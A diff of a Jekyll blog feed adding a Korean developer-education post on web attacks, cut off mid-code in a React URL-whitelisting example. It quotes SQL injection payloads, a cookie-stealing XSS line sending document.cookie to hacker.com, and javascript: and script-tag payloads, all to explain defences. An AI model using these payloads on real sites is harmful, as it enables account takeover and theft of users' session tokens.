@@ -1,4 +1,358 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-02-26T16:57:16+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">코발트 팀 블로그</title><subtitle>혁신을 추구하다, 코발트</subtitle><author><name>Cobalt. Inc.</name></author><entry><title type="html">MongoDB 이해하기</title><link href="http://localhost:4000/posts/about-mongodb" rel="alternate" type="text/html" title="MongoDB 이해하기" /><published>2021-02-25T00:00:00+09:00</published><updated>2021-02-25T00:00:00+09:00</updated><id>http://localhost:4000/posts/about-mongodb</id><content type="html" xml:base="http://localhost:4000/posts/about-mongodb">&lt;p&gt; 사내에서 MongoDB를 잘 쓰기위한 스터디를 하게되어 이번 기회에 관련 자료를 정리하기로 했다. MongoDB가 왜 필요한지, 더 잘사용하기 위해서 무엇이 필요한지를 중심으로 처음 MongoDB를 사용할 때 도움이 될 만한 내용으로 정리했다.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-03-02T11:51:17+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">코발트 팀 블로그</title><subtitle>혁신을 추구하다, 코발트</subtitle><author><name>Cobalt. Inc.</name></author><entry><title type="html">웹 개발을 위해 꼭 알아야하는 보안 공격</title><link href="http://localhost:4000/posts/basic-web-hacking" rel="alternate" type="text/html" title="웹 개발을 위해 꼭 알아야하는 보안 공격" /><published>2021-02-28T00:00:00+09:00</published><updated>2021-02-28T00:00:00+09:00</updated><id>http://localhost:4000/posts/basic-web-hacking</id><content type="html" xml:base="http://localhost:4000/posts/basic-web-hacking">&lt;p&gt; 이번 포스팅에선 아주 중요하지만 프로그래밍 교육 과정에서 크게 다루지 않는 &lt;strong&gt;보안&lt;/strong&gt;에 대해 이야기 해보려고 한다. 최근엔 프레임워크나 라이브러리 차원에서 잘 막아주기 때문에 큰 언급없이 넘어가는 경우가 많지만 소프트웨어 개발자는 꼭 보안 전문가가 아니더라도 기초적인 공격 방법에 대해 이해하고 방어하는 방법을 알아야 할 필요가 있다.&lt;/p&gt;
+
+&lt;p&gt; 사례를 들어보자면 필자가 고등학생이던 시절 웹하드 서비스의 어드민 계정을 SQL Injection을 이용하여 탈취하는 데 성공했다는 얘기를 교내에서 심심찮게 들을 수 있었고 실제로 본 적도 있었다. 이처럼 보안에 대한 기본적인 상식이 없다면 고등학생도 할 수 있는 아주 간단한 공격에도 손쉽게 뚫린다.&lt;/p&gt;
+
+&lt;p&gt; 특히 어느정도 궤도에 오른 서비스는 작정하고 덤비는 해커부터 재미로 공격해보는 해커까지 꽤 자주 해킹 시도를 받는다. 보안이란 것은 아주 단순한 부분이라도 실수한다면 쉽게 뚫리기 때문에 예상치 못한 큰 피해를 입을 수 있다. 과장해서 표현하자면 내가 짠 코드로 인해 서비스가 한 순간에 망할 수도 있다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img src=&quot;/assets/img/2021-02-28-basic-web-hacking/news.png&quot; /&gt;
+  &lt;figcaption&gt;한 순간의 실수로 서비스가 망할 수도 있다! 😨&lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;p&gt; 하지만 너무 겁먹지 않아도 괜찮다. 요즘은 프레임워크를 이용하여 개발자의 실수를 잘 막아주고 만약 실수할 일이 생기더라도 이번 포스트를 통해 기초적인 상식을 익히고나면 금새 알아차릴 수 있을거라 생각한다. 그러니 만약 웹 보안에 대해 잘 모른다면 이번 기회에 웹 개발자들이 상식으로 알아야할 웹 해킹 기법에 대해서 알아보도록 하자.&lt;/p&gt;
+
+&lt;h2 id=&quot;웹-해킹&quot;&gt;웹 해킹&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;웹 사이트의 취약점을 공격하는 기술적 위협으로, 웹 페이지를 통하여 &lt;strong&gt;권한이 없는 시스템에 접근하거나 데이터 유출 및 파괴&lt;/strong&gt;와 같은 행위를 말한다.&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://ko.wikipedia.org/wiki/웹_해킹&quot;&gt;https://ko.wikipedia.org/wiki/웹_해킹&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt; 웹 사이트의 취약점을 공격하는 방법은 굉장히 많다. 이번 포스트에선 그 중 중요하고 자주 사용되는 공격에 대해서 알아볼 것이다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;SQL Injection&lt;/li&gt;
+  &lt;li&gt;XSS&lt;/li&gt;
+  &lt;li&gt;CSRF Attack&lt;/li&gt;
+  &lt;li&gt;File Upload Attack&lt;/li&gt;
+  &lt;li&gt;Command Injection&lt;/li&gt;
+  &lt;li&gt;…&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h2&gt;
+
+&lt;p&gt; 보통 웹 해킹을 접한다면 가장 먼저 배우는 공격 기법이다. 그만큼 간단하고 적용하기도 쉽지만 아주 강력한 공격이다. SQL Injection은 서버에서 실행되는 SQL을 악의적으로 이용하는 공격이다. 이름처럼 기존 SQL에 &lt;strong&gt;악의적인 SQL 구문을 삽입&lt;/strong&gt;하여 데이터 탈취, 삭제 등을 할 수 있다. 그렇기 때문에 뚫리면 서비스 종료각이 나온다.&lt;/p&gt;
+
+&lt;p&gt; 사실 요즘은 대부분의 SQL 지원 라이브러리에서 SQL Injection을 방어해준다. 그렇지만 프레임워크 없이 쌩 PHP, JSP를 자주 사용하던 시절엔 꽤 자주 발생하는 사고였다. 다음과 같은 PHP 코드가 있다고 가정해보자.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$mysqli&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;SELECT * FROM users WHERE username='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;' AND password='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt; 아주 단순한 코드다. 위 코드를 간단히 설명하자면 POST 요청을 통해 파라메터로 전달 받은 &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt;과 &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt;를 각각 변수에 대입한 후 MySQL 드라이버를 통해 쿼리를 보내는 로직이다. 이 때 주의깊게 봐야하는 부분은 쿼리에서 &lt;code class=&quot;highlighter-rouge&quot;&gt;String interpolation&lt;/code&gt;하는 부분이다. 아무 문제 없어보이는 이 String은 사실 엄청난 보안 허점이다. 만약 다음과 같이 데이터가 전달되었다고 가정해보자.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// admin
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// password' OR 1=1 --
+&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$mysqli&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;SELECT * FROM users WHERE username='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;' AND password='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// SELECT * FROM users WHERE username='admin' AND password='password' OR 1=1 --'
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt; 만약 &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt;과 &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt;가 각각 문자열 &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt;과 &lt;code class=&quot;highlighter-rouge&quot;&gt;password' OR 1=1 --&lt;/code&gt;로 들어왔다면 아래 쿼리는 &lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT * FROM users WHERE username='admin' AND password='password' OR 1=1 --'&lt;/code&gt;로 구성된다. &lt;code class=&quot;highlighter-rouge&quot;&gt;OR 1=1&lt;/code&gt;이 추가되었기 때문에 패스워드가 틀리더라도 해당 쿼리는 &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt;를 반환한다. 만약 방어가 되어있지 않다면 쉽게 타인의 계정으로 로그인 할 수 있게된다.&lt;/p&gt;
+
+&lt;p&gt; 사실 방어는 그렇게 크게 어렵지 않다. 웹 보안에서 가장 중요한 부분이 &lt;strong&gt;문제가 될 수 있는 문자열을 필터링&lt;/strong&gt;하는건데 &lt;strong&gt;SQL Injection&lt;/strong&gt;도 &lt;code class=&quot;highlighter-rouge&quot;&gt;\n, \t, |, #, --, &amp;amp;&lt;/code&gt; 같은 문자열을 필터링하는 것으로 쉽게 방어가 가능하다. 즉 정리하면 다음과 같다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;SQL에서 특별한 의미를 가지는 문자를 이스케이프한다. ex) \n, \t, |, /, &amp;amp;, #, …&lt;/li&gt;
+  &lt;li&gt;준비된 선언을 사용한다.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt; 준비된 선언은 조금 생소할 수 있는데 Placeholder를 넣은 쿼리를 먼저 DB에 보낸 후 Placeholder에 해당하는 데이터를 DB로 보내는 방법이다. 이를 통해 &lt;strong&gt;SQL Injection&lt;/strong&gt;을 방어할 수 있다.&lt;/p&gt;
+
+&lt;p&gt; SQL Injection은 앞서 소개한 방식 외에도 다양한 공격 방법이 있다. 앞서 소개한 방어 방법으로 막을 수 있지만 일단 알아두자.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Error based SQL Injection&lt;/strong&gt;
+    &lt;ul&gt;
+      &lt;li&gt;일부러 SQL 에러를 발생시켜서 원하는 정보를 취득하는 공격 기법이다. 에러가 발생하면 DB에 대한 정보를 단편적으로 얻을 수 있게 되므로 에러 메시지가 노출되지 않도록 조심해야한다.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Blind SQL Injection&lt;/strong&gt;
+    &lt;ul&gt;
+      &lt;li&gt;쿼리 결과의 참/거짓 정보를 보고 원하는 정보가 존재하는지 추론할 수 있다. 이를 통해 데이터베이스, 테이블, 컬럼 명을 파악할 수 있다.
+        &lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'1'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;database&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'us'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;#&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+        &lt;p&gt;참고로 SQLMap과 같은 툴을 사용하면 Blind SQL Injection 공격 자동화가 가능하다.&lt;/p&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Union SQL Injection&lt;/strong&gt;
+    &lt;ul&gt;
+      &lt;li&gt;Union 명령을 이용해서 정보를 취득할 수 있다.
+        &lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'1'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;UNION&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;#&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt; 위 세 가지 공격 방법에 대한 치트 시트가 존재한다. 조금 더 자세히 알고 싶다면 이 &lt;a href=&quot;https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/&quot;&gt;링크&lt;/a&gt;를 확인해보자.&lt;/p&gt;
+
+&lt;h3 id=&quot;주의-할-점&quot;&gt;주의 할 점&lt;/h3&gt;
+
+&lt;p&gt; 프레임워크나 라이브러리에서 이스케이핑을 통해 방어해주더라도 무작정 신뢰할 수는 없다. 혹시 모를 사고에 대비하기 위해 추가적인 작업을 할 수 있다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;파라미터 Validation&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://code.google.com/archive/p/apache-scalp/&quot;&gt;apache-scalp&lt;/a&gt;와 같은 공격 로그 분석 툴을 사용한다.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;cross-site-scription-xss&quot;&gt;Cross-Site Scription (XSS)&lt;/h2&gt;
+
+&lt;p&gt; 웹 페이지에 악성 자바스크립트를 삽입하는 공격이다. 이 공격을 이용하면 사이트 이용자의 정보를 손쉽게 탈취할 수 있다. 아주 간단한 사례를 살펴보면 사용자가 입력할 수 있는 게시판 같은 페이지에 자바스크립트 코드를 입력하는 것이다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img src=&quot;/assets/img/2021-02-28-basic-web-hacking/xss-example.png&quot; /&gt;
+  &lt;figcaption&gt;만약 필터링이 안된다면...&lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;p&gt; 공격 방법은 단순하지만 아주 효과적이다. 최근엔 SPA(Single-Page Application)로 배포되는 서비스가 많은데, 인증 관리를 위해 토큰은 &lt;code class=&quot;highlighter-rouge&quot;&gt;Cookie&lt;/code&gt; 혹은 &lt;code class=&quot;highlighter-rouge&quot;&gt;localStorage&lt;/code&gt;에 저장하는 경우가 많다. 이때 &lt;strong&gt;XSS&lt;/strong&gt; 방어 준비가 되어있지 않은 경우 자바스크립트를 통해 불특정 다수의 사용자 토큰을 손쉽게 탈취 할 수 있다. 위 사진을 보면 &lt;code class=&quot;highlighter-rouge&quot;&gt;document.URL = 'http://hacker.com?cookie'+document.cookie&lt;/code&gt;를 통해 해커 사이트에 쿠키 정보를 전달하는 것을 확인 할 수 있다.&lt;/p&gt;
+
+&lt;p&gt; SQL Injection처럼 XSS도 필터링을 통해 쉽게 방어할 수 있다. 다음과 같이 꼼꼼하게 방어하자.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;서버에 데이터를 저장할 때 HTML 필터링을 한 후 데이터베이스에 저장한다.&lt;br /&gt;ex) &amp;lt;, &amp;gt;, script, style, &amp;amp;, /, …&lt;/li&gt;
+  &lt;li&gt;후술할 &lt;strong&gt;Reflected XSS&lt;/strong&gt;나 &lt;strong&gt;DOM Based XSS&lt;/strong&gt; 공격 방어를 위해 서버에서 파라미터 검증을 한다.&lt;/li&gt;
+  &lt;li&gt;혹시나 모를 상황에 대비하여 프론트엔드에서도 필터링이 필요하다.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt; 앞서 소개한 공격 방법은 &lt;strong&gt;Stored XSS&lt;/strong&gt;라고 부른다. 다른 유명한 공격 방법은 Reflected XSS와 DOM Based XSS가 있다. 아마 Stored XSS은 너무 유명해서 많은 개발자들이 이미 알고 있었을 것이라 생각한다. 하지만 나머지 두 공격은 잘 모르는 개발자들이 꽤 있다.&lt;/p&gt;
+
+&lt;p&gt; &lt;strong&gt;Reflected XSS&lt;/strong&gt;는 이름처럼 입력을 그대로 브라우저에 출력하는 로직을 공격하는 방법이다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img src=&quot;/assets/img/2021-02-28-basic-web-hacking/papago.png&quot; /&gt;
+  &lt;figcaption&gt;만약 필터링을 안했다면...&lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;p&gt; 위 사진을 보면 &lt;a href=&quot;https://papago.naver.com/&quot;&gt;파파고&lt;/a&gt;에서 번역할 내용에 스크립트 태그를 적용했다. 이때 그대로 입력한 스크립트가 우측 박스에 노출된다. 만약 파파고가 XSS에 대한 대비를 안했다면 그대로 스크립트가 실행됐을 것이다. 파파고는 번역을 누르면 외부 공개가 가능한 링크가 생성되는데 해커는 해당 링크를 불특정 다수에게 클릭하도록 공유할 수 있다. 사용자가 해당 링크를 클릭하면 바로 해킹 위협에 노출되는 것이다. &lt;a href=&quot;https://papago.naver.com/?sk=ko&amp;amp;tk=en&amp;amp;st=&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;해당 링크&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt; Reflected XSS는 서버 파라미터 검증과 프론트엔드 필터링을 통해 방어할 수 있다. 만약 스크립트를 실행시키는 파라미터 값이 들어온다면 적절히 필터링하면 된다. &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;, &amp;gt;, &amp;amp;, /&lt;/code&gt;와 같은 문자를 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;lt;&lt;/code&gt; 같은 특수문자 코드로 바꾸고 Redirect하는 것을 추천한다. 그런데 요즘은 브라우저가 알아서 잘 막아준다. 그래도 구형 브라우저를 쓰거나 지원 안하는 브라우저를 쓸 수도 있으니 방심하지는 말자.&lt;/p&gt;
+
+&lt;p&gt; 다음으로 &lt;strong&gt;DOM Based XSS&lt;/strong&gt;는 서비스의 스크립트를 이용하여 DOM에 악의적인 스크립트가 노출되도록 공격하는 방법을 말한다. Reflected XSS와 유사해보이지만 서버를 타지않고 DOM을 조작할 수 있기 때문에 문제를 찾기 힘들다는 문제가 있다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img src=&quot;/assets/img/2021-02-28-basic-web-hacking/dom-based-xss.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt; 만약 base64 to image 서비스를 하는 위 사이트에서 XSS 필터링이 안됐다면, 그리고 공유가 가능했다면 XSS 취약점이 있는 샘이다. (실제로는 잘 막혀있고 브라우저 차원에서도 막아준다)&lt;/p&gt;
+
+&lt;p&gt; 사실 XSS는 필터링만 잘하면 쉽게 막을 수 있는 공격이다. 특히 요즘은 프레임워크와 브라우저가 XSS 필터링을 통해 웬만한 공격은 막아주기 때문에 Stored XSS만 조심해도 큰 문제는 없을 것 같다. 하지만 여러 우회 방법이 개발되고 있고 서비스가 복잡해지는 만큼 XSS 취약점이 드러날 확률이 높다. 아주 조금의 틈이라도 있다면 여러 우회 방법을 통해 뚫릴 수 있으니 조심하자.&lt;/p&gt;
+
+&lt;h3 id=&quot;주의-할-점-1&quot;&gt;주의 할 점&lt;/h3&gt;
+
+&lt;p&gt; 최근엔 React나 Vue.js와 같은 프론트엔드 프레임워크, 라이브러리를 사용하여 XSS에 대한 방어가 어느정도 자동화된다. 그럼에도 불구하고 사용자의 실수로 취약점이 드러날 수 있다. 예를 들어, React에서 다음과 같은 실수를 할 수 있다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dangerouslySetInnerHTML&lt;/code&gt; 속성을 사용한다.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;href&lt;/code&gt;를 통한 XSS 공격 허용&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt; React는 문자열 변수를 자동으로 이스케이핑해주기 때문에 웬만하면 문제가 되지 않는다. 하지만 &lt;code class=&quot;highlighter-rouge&quot;&gt;dangerouslySetInnerHTML&lt;/code&gt; 속성을 사용하면 문자열에 HTML 태그가 있더라도 그대로 출력하기 때문에 위험하다. 꼭 사용해야 한다면 절대로 사용자 입력이 들어올 수 없도록 조치하거나 자바스크립트 코드가 존재하는지 검증이 필요하다.&lt;/p&gt;
+
+&lt;p&gt; 이어서 외부 웹 페이지에 접속하기 위해 각 프레임워크가 제공해주는 Router가 아닌 앵커 태그를 쓸때가 있다. 앵커 태그의 &lt;code class=&quot;highlighter-rouge&quot;&gt;href&lt;/code&gt; 속성은 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;a href='javascript:alert(&quot;xss&quot;);'&amp;gt;XSS&amp;lt;/a&amp;gt;&lt;/code&gt;처럼 자바스크립트 프로토콜을 사용하여 스크립트를 실행시킬 수 있다. 이를 막기 위해서 &lt;code class=&quot;highlighter-rouge&quot;&gt;href&lt;/code&gt; 속성에 들어가는 값은 추가적인 필터링이 필요하다. 필터링에는 블랙리스트와 화이트리스트가 존재하는데 이 경우 화이트리스트를 통한 필터링을 추천한다. 다음과 같이 컴포넌트를 만들 수 있다. &lt;a href=&quot;https://medium.com/javascript-security/avoiding-xss-in-react-is-still-hard-d2b5c7ad9412&quot;&gt;코드 출처&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;React&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Component&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'react'&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ReactDOM&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'react-dom'&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'url-parse'&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SafeURL&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Component&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;isSafe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dangerousURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dangerousURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{})&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;protocol&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'javascript:'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;
